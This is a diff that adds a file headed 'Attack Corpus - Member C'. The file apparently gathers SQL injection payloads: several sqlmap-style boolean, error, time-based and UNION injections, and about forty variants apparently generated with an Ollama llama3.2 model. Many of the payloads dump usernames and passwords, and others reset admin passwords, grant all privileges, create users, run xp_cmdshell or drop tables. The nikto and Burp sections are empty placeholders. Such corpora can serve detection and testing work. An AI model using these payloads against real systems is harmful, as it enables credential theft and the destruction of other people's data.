@@ -1,0 +1,57 @@
+# Attack Corpus - Member C
+# === SET 1: sqlmap payloads ===
+id=1' OR NOT 4765=4765-- Iidz&Submit=Submit
+id=1' AND (SELECT 1521 FROM(SELECT COUNT(*),CONCAT(0x7171766271,(SELECT (ELT(1521=1521,1))),0x7162707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FUnz&Submit=Submit
+id=1' AND (SELECT 2794 FROM (SELECT(SLEEP(5)))OuKR)-- QVmU&Submit=Submit
+id=1' UNION ALL SELECT CONCAT(0x7171766271,0x4561744a687670454a735066656e78457858505a52544155714e586e58416741666e536141594f67,0x7162707171),NULL-- -&Submit=Submit
+
+# === SET 2: nikto findings ===
+# nikto - add when complete
+# === SET 3: Burp replays ===
+# add burp exports here
+# === SET 3: Burp replays ===
+# add burp exports here
+
+# === Ollama/llama3.2 variants ===
+
+# === Ollama/llama3.2 variants ===
+' OR 'y'='y'
+UNION SELECT NULL,username,password FROM users UNION SELECT 0
+' OR '2'='4'
+admin' OR 1=1
+1; DROP TABLE users; --
+admin UNION SELECT null,username,password FROM users #
+1; INSERT INTO temp VALUES (NULL); 
+' AND SLEEP(3)
+OR 'x'='^'
+'; EXEC xp_cmdshell('echo off')--
+'; DROP TABLE users; -- #
+' OR 'x'=UNION SELECT null,username,password FROM users--
+1; SELECT DATABASE()--
+' UNION SELECT SUBSTRING(username,2,1) FROM users--
+' AND SLEEP(5); UPDATE users SET password='a'--
+admin' OR '4'='4
+' UNION SELECT now(),username,password FROM users--
+'); CREATE TABLE temp(id INT PRIMARY KEY)--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')='b'--
+' UNION SELECT substring('hello',2) FROM users--
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='a')='a'--
+UNION SELECT 1,0 FROM dual--
+admin'// --
+1; UPDATE users SET password = 'password' WHERE username = 'admin';--
+' UNION SELECT null,CONCAT(username,'\x20') FROM users--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'--
+'; DELETE FROM comments WHERE id=3--
+' OR BINARY 1=1// --
+UNION SELECT NULL,username FROM users WHERE username='test user'--
+1; GRANT ALL PRIVILEGES ON *.* TO 'testuser'@'%';--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>'c'--
+' OR 'x'='y'
+1; DROP TABLE products--
+' UNION SELECT null,username FROM users--
+admin',NULL,''
+' AND SLEEP(3)--
+1; CREATE USER 'guest'@'%';--
+' OR 1=0--
+2*(' OR 'x'='x')
+' AND (SELECT SUBSTRING(username,1,4) FROM users WHERE username='admin')='d'--
